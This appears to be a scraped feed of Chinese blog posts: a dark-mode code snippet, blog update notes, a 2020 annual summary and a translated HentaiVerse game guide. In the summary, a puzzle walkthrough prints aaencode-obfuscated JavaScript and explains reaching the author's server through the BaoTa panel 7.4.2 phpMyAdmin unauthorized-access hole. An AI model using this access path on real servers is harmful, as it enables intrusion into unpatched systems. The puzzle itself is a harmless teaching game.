class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 